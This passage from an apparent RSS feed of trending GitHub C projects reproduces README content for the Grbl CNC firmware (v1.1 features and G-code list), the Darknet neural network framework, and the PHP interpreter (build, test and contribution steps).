&lt;h3&gt;&lt;a id="user-content-official-supporters-of-the-grbl-cnc-project" class="anchor" aria-hidden="true" href="#official-supporters-of-the-grbl-cnc-project"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Official Supporters of the Grbl CNC Project&lt;/h3&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://github.com/gnea/gnea-Media/blob/master/Contributors.png?raw=true"&gt;&lt;img src="https://github.com/gnea/gnea-Media/raw/master/Contributors.png?raw=true" alt="Official Supporters" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;a id="user-content-update-summary-for-v11" class="anchor" aria-hidden="true" href="#update-summary-for-v11"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Update Summary for v1.1&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IMPORTANT:&lt;/strong&gt; Your EEPROM will be wiped and restored with new settings. This is due to the addition of two new spindle speed '$' settings.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Real-time Overrides&lt;/strong&gt; : Alters the machine running state immediately with feed, rapid, spindle speed, spindle stop, and coolant toggle controls. This awesome new feature is common only on industrial machines, often used to optimize speeds and feeds while a job is running. Most hobby CNC's try to mimic this behavior, but usually have large amounts of lag. Grbl executes overrides in realtime and within tens of milliseconds.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Jogging Mode&lt;/strong&gt; : The new jogging commands are independent of the g-code parser, so that the parser state doesn't get altered and cause a potential crash if not restored properly. Documentation is included on how this works and how it can be used to control your machine via a joystick or rotary dial with a low-latency, satisfying response.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Laser Mode&lt;/strong&gt; : The new "laser" mode will cause Grbl to move continuously through consecutive G1, G2, and G3 commands with spindle speed changes. When "laser" mode is disabled, Grbl will instead come to a stop to ensure a spindle comes up to speed properly. Spindle speed overrides also work with laser mode so you can tweak the laser power, if you need to during the job. Switch between "laser" mode and "normal" mode via a &lt;code&gt;$&lt;/code&gt; setting.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Dynamic Laser Power Scaling with Speed&lt;/strong&gt; : If your machine has low accelerations, Grbl will automagically scale the laser power based on how fast Grbl is traveling, so you won't have burnt corners when your CNC has to make a turn! Enabled by the &lt;code&gt;M4&lt;/code&gt; spindle CCW command when laser mode is enabled!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Sleep Mode&lt;/strong&gt; : Grbl may now be put to "sleep" via a &lt;code&gt;$SLP&lt;/code&gt; command. This will disable everything, including the stepper drivers. Nice to have when you are leaving your machine unattended and want to power down everything automatically. Only a reset exits the sleep state.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Significant Interface Improvements&lt;/strong&gt;: Tweaked to increase overall performance, include lots more real-time data, and to simplify maintaining and writing GUIs. Based on direct feedback from multiple GUI developers and bench performance testing. &lt;em&gt;NOTE: GUIs need to specifically update their code to be compatible with v1.1 and later.&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;New Status Reports&lt;/strong&gt;: To account for the additional override data, status reports have been tweaked to cram more data into it, while still being smaller than before. Documentation is included, outlining how it has been changed.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Improved Error/Alarm Feedback&lt;/strong&gt; : All Grbl error and alarm messages have been changed to providing a code. Each code is associated with a specific problem, so users will know exactly what is wrong without having to guess. Documentation and an easy to parse CSV is included in the repo.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Extended-ASCII realtime commands&lt;/strong&gt; : All overrides and future real-time commands are defined in the extended-ASCII character space. Unfortunately not easily type-able on a keyboard, but helps prevent accidental commands from a g-code file having these characters and gives lots of space for future expansion.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Message Prefixes&lt;/strong&gt; : Every message type from Grbl has a unique prefix to help GUIs immediately determine what the message is and parse it accordingly without having to know context. The prior interface had several instances of GUIs having to figure out the meaning of a message, which made everything more complicated than it needed to be.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New OEM specific features, such as safety door parking, single configuration file build option, EEPROM restrictions and restoring controls, and storing product data information.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New safety door parking motion as a compile-option. Grbl will retract, disable the spindle/coolant, and park near Z max. When resumed, it will perform these task in reverse order and continue the program. Highly configurable, even to add more than one parking motion. See config.h for details.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;New '$' Grbl settings for max and min spindle rpm. Allows for tweaking the PWM output to more closely match true spindle rpm. When max rpm is set to zero or less than min rpm, the PWM pin D11 will act like a simple enable on/off output.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Updated G28 and G30 behavior from NIST to LinuxCNC g-code description. In short, if a intermediate motion is specified, only the axes specified will move to the stored coordinates, not all axes as before.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Lots of minor bug fixes and refactoring to make the code more efficient and flexible.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Arduino Mega2560 support has been moved to an active, official Grbl-Mega &lt;a href="http://www.github.com/gnea/grbl-Mega/"&gt;project&lt;/a&gt;. All new developments here and there will be synced when it makes sense to.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;List of Supported G-Codes in Grbl v1.1:
  - Non-Modal Commands: G4, G10L2, G10L20, G28, G30, G28.1, G30.1, G53, G92, G92.1
  - Motion Modes: G0, G1, G2, G3, G38.2, G38.3, G38.4, G38.5, G80
  - Feed Rate Modes: G93, G94
  - Unit Modes: G20, G21
  - Distance Modes: G90, G91
  - Arc IJK Distance Modes: G91.1
  - Plane Select Modes: G17, G18, G19
  - Tool Length Offset Modes: G43.1, G49
  - Cutter Compensation Modes: G40
  - Coordinate System Modes: G54, G55, G56, G57, G58, G59
  - Control Modes: G61
  - Program Flow: M0, M1, M2, M30*
  - Coolant Control: M7*, M8, M9
  - Spindle Control: M3, M4, M5
  - Valid Non-Command Words: F, I, J, K, L, N, P, R, S, T, X, Y, Z
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Grbl is an open-source project and fueled by the free-time of our intrepid administrators and altruistic users. If you'd like to donate, all proceeds will be used to help fund supporting hardware and testing equipment. Thank you!&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&amp;amp;hosted_button_id=CUGXJHXA36BYW" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/bce14c8e2e39ba0464551b34602b4c60c182526b/68747470733a2f2f7777772e70617970616c6f626a656374732e636f6d2f656e5f55532f692f62746e2f62746e5f646f6e6174655f4c472e676966" alt="Donate" data-canonical-src="https://www.paypalobjects.com/en_US/i/btn/btn_donate_LG.gif" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>gnea</author><guid isPermaLink="false">https://github.com/gnea/grbl</guid><pubDate>Tue, 04 Feb 2020 00:13:00 GMT</pubDate></item><item><title>pjreddie/darknet #14 in C, This week</title><link>https://github.com/pjreddie/darknet</link><description>&lt;p&gt;&lt;i&gt;Convolutional Neural Networks&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/e69d4118b20a42de4e23b9549f9a6ec6dbbb0814/687474703a2f2f706a7265646469652e636f6d2f6d656469612f66696c65732f6461726b6e65742d626c61636b2d736d616c6c2e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/e69d4118b20a42de4e23b9549f9a6ec6dbbb0814/687474703a2f2f706a7265646469652e636f6d2f6d656469612f66696c65732f6461726b6e65742d626c61636b2d736d616c6c2e706e67" alt="Darknet Logo" data-canonical-src="http://pjreddie.com/media/files/darknet-black-small.png" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;&lt;a id="user-content-darknet" class="anchor" aria-hidden="true" href="#darknet"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Darknet&lt;/h1&gt;
&lt;p&gt;Darknet is an open source neural network framework written in C and CUDA. It is fast, easy to install, and supports CPU and GPU computation.&lt;/p&gt;
&lt;p&gt;For more information see the &lt;a href="http://pjreddie.com/darknet" rel="nofollow"&gt;Darknet project website&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For questions or issues please use the &lt;a href="https://groups.google.com/forum/#!forum/darknet" rel="nofollow"&gt;Google Group&lt;/a&gt;.&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>pjreddie</author><guid isPermaLink="false">https://github.com/pjreddie/darknet</guid><pubDate>Tue, 04 Feb 2020 00:14:00 GMT</pubDate></item><item><title>php/php-src #15 in C, This week</title><link>https://github.com/php/php-src</link><description>&lt;p&gt;&lt;i&gt;The PHP Interpreter&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;div align="center"&gt;
    &lt;a href="https://php.net" rel="nofollow"&gt;
        &lt;img alt="PHP" src="https://camo.githubusercontent.com/f7ca3c85e85a1a5b05ef1583af3921e6f4aea77e/68747470733a2f2f7777772e7068702e6e65742f696d616765732f6c6f676f732f6e65772d7068702d6c6f676f2e737667" width="150" data-canonical-src="https://www.php.net/images/logos/new-php-logo.svg" style="max-width:100%;"&gt;
    &lt;/a&gt;
&lt;/div&gt;
&lt;h1&gt;&lt;a id="user-content-the-php-interpreter" class="anchor" aria-hidden="true" href="#the-php-interpreter"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;The PHP Interpreter&lt;/h1&gt;
&lt;p&gt;PHP is a popular general-purpose scripting language that is especially suited to
web development. Fast, flexible and pragmatic, PHP powers everything from your
blog to the most popular websites in the world. PHP is distributed under the
&lt;a href="LICENSE"&gt;PHP License v3.01&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href="https://travis-ci.org/php/php-src" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/a77703f0e98ef703fe4501ff9bb458bcfd2255ac/68747470733a2f2f7472617669732d63692e6f72672f7068702f7068702d7372632e7376673f6272616e63683d6d6173746572" alt="Build status" data-canonical-src="https://travis-ci.org/php/php-src.svg?branch=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://ci.appveyor.com/project/php/php-src" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/815cc68f59711fcb16a8f52310b24b6c5dd36175/68747470733a2f2f63692e6170707665796f722e636f6d2f6170692f70726f6a656374732f7374617475732f6d6579757236667669617867647764792f6272616e63682f6d61737465723f7376673d74727565" alt="Build status" data-canonical-src="https://ci.appveyor.com/api/projects/status/meyur6fviaxgdwdy/branch/master?svg=true" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://dev.azure.com/phpazuredevops/php/_build/latest?definitionId=1&amp;amp;branchName=master" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/116c8ecedadad1f5238210aea089e96605410348/68747470733a2f2f6465762e617a7572652e636f6d2f706870617a7572656465766f70732f7068702f5f617069732f6275696c642f7374617475732f7068702e7068702d7372633f6272616e63684e616d653d6d6173746572" alt="Build Status" data-canonical-src="https://dev.azure.com/phpazuredevops/php/_apis/build/status/php.php-src?branchName=master" style="max-width:100%;"&gt;&lt;/a&gt;
&lt;a href="https://bugs.chromium.org/p/oss-fuzz/issues/list?sort=-opened&amp;amp;can=1&amp;amp;q=proj:php" rel="nofollow"&gt;&lt;img src="https://camo.githubusercontent.com/d123ac36a68cbc6ea9c313a080126a41a14067e2/68747470733a2f2f6f73732d66757a7a2d6275696c642d6c6f67732e73746f726167652e676f6f676c65617069732e636f6d2f6261646765732f7068702e737667" alt="Fuzzing Status" data-canonical-src="https://oss-fuzz-build-logs.storage.googleapis.com/badges/php.svg" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-documentation" class="anchor" aria-hidden="true" href="#documentation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Documentation&lt;/h2&gt;
&lt;p&gt;The PHP manual is available at &lt;a href="https://php.net/docs" rel="nofollow"&gt;php.net/docs&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
&lt;h3&gt;&lt;a id="user-content-prebuilt-packages-and-binaries" class="anchor" aria-hidden="true" href="#prebuilt-packages-and-binaries"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Prebuilt packages and binaries&lt;/h3&gt;
&lt;p&gt;Prebuilt packages and binaries can be used to get up and running fast with PHP.&lt;/p&gt;
&lt;p&gt;For Windows, the PHP binaries can be obtained from
&lt;a href="https://windows.php.net" rel="nofollow"&gt;windows.php.net&lt;/a&gt;. After extracting the archive the
&lt;code&gt;*.exe&lt;/code&gt; files are ready to use.&lt;/p&gt;
&lt;p&gt;For other systems, see the &lt;a href="https://php.net/install" rel="nofollow"&gt;installation chapter&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-building-php-source-code" class="anchor" aria-hidden="true" href="#building-php-source-code"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Building PHP source code&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;For Windows, see &lt;a href="https://wiki.php.net/internals/windows/stepbystepbuild_sdk_2" rel="nofollow"&gt;Build your own PHP on Windows&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;PHP uses autotools on Unix systems to configure the build:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./buildconf
./configure [options]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;See &lt;code&gt;./configure -h&lt;/code&gt; for configuration options.&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make [options]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;em&gt;See &lt;code&gt;make -h&lt;/code&gt; for make options.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;-j&lt;/code&gt; option shall set the maximum number of jobs &lt;code&gt;make&lt;/code&gt; can use for the
build:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make -j4
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Shall run &lt;code&gt;make&lt;/code&gt; with a maximum of 4 concurrent jobs: Generally the maximum
number of jobs should not exceed the number of cores available.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-testing-php-source-code" class="anchor" aria-hidden="true" href="#testing-php-source-code"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Testing PHP source code&lt;/h2&gt;
&lt;p&gt;PHP ships with an extensive test suite, the command &lt;code&gt;make test&lt;/code&gt; is used after
successful compilation of the sources to run this test suite.&lt;/p&gt;
&lt;p&gt;It is possible to run tests using multiple cores by setting &lt;code&gt;-jN&lt;/code&gt; in
&lt;code&gt;TEST_PHP_ARGS&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make TEST_PHP_ARGS=-j4 test
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Shall run &lt;code&gt;make test&lt;/code&gt; with a maximum of 4 concurrent jobs: Generally the maximum
number of jobs should not exceed the number of cores available.&lt;/p&gt;
&lt;p&gt;The &lt;a href="https://qa.php.net" rel="nofollow"&gt;qa.php.net&lt;/a&gt; site provides more detailed info about
testing and quality assurance.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installing-php-built-from-source" class="anchor" aria-hidden="true" href="#installing-php-built-from-source"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installing PHP built from source&lt;/h2&gt;
&lt;p&gt;After a successful build (and test), PHP may be installed with:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;make install
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Depending on your permissions and prefix, &lt;code&gt;make install&lt;/code&gt; may need super user
permissions.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-php-extensions" class="anchor" aria-hidden="true" href="#php-extensions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;PHP extensions&lt;/h2&gt;
&lt;p&gt;Extensions provide additional functionality on top of PHP. PHP consists of many
essential bundled extensions. Additional extensions can be found in the PHP
Extension Community Library - &lt;a href="https://pecl.php.net" rel="nofollow"&gt;PECL&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;The PHP source code is located in the Git repository at
&lt;a href="https://git.php.net" rel="nofollow"&gt;git.php.net&lt;/a&gt;. Contributions are most welcome by forking
the &lt;a href="https://github.com/php/php-src"&gt;GitHub mirror repository&lt;/a&gt; and sending a
pull request.&lt;/p&gt;
&lt;p&gt;Discussions are done on GitHub, but depending on the topic can also be relayed
to the official PHP developer mailing list &lt;a href="mailto:internals@lists.php.net"&gt;internals@lists.php.net&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;New features require an RFC and must be accepted by the developers. See
&lt;a href="https://wiki.php.net/rfc" rel="nofollow"&gt;Request for comments - RFC&lt;/a&gt; and
&lt;a href="https://wiki.php.net/rfc/voting" rel="nofollow"&gt;Voting on PHP features&lt;/a&gt; for more information
on the process.&lt;/p&gt;
&lt;p&gt;Bug fixes &lt;strong&gt;do not&lt;/strong&gt; require an RFC but require a bug tracker ticket. Open a
ticket at &lt;a href="https://bugs.php.net" rel="nofollow"&gt;bugs.php.net&lt;/a&gt; and reference the bug id using
&lt;code&gt;#NNNNNN&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Fix #55371: get_magic_quotes_gpc() throws deprecation warning

After removing magic quotes, the get_magic_quotes_gpc function caused a
deprecated warning. get_magic_quotes_gpc can be used to detect the
magic_quotes behavior and therefore should not raise a warning at any time.
The patch removes this warning.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Pull requests are not merged directly on GitHub. All PRs will be pulled and
pushed through &lt;a href="https://git.php.net" rel="nofollow"&gt;git.php.net&lt;/a&gt;. See
&lt;a href="https://wiki.php.net/vcs/gitworkflow" rel="nofollow"&gt;Git workflow&lt;/a&gt; for more details.&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-guidelines-for-contributors" class="anchor" aria-hidden="true" href="#guidelines-for-contributors"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Guidelines for contributors&lt;/h3&gt;
&lt;p&gt;See further documents in the repository for more information on how to
contribute:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="/CONTRIBUTING.md"&gt;Contributing to PHP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="/CODING_STANDARDS.md"&gt;PHP coding standards&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="/docs/mailinglist-rules.md"&gt;Mailinglist rules&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="/docs/release-process.md"&gt;PHP release process&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
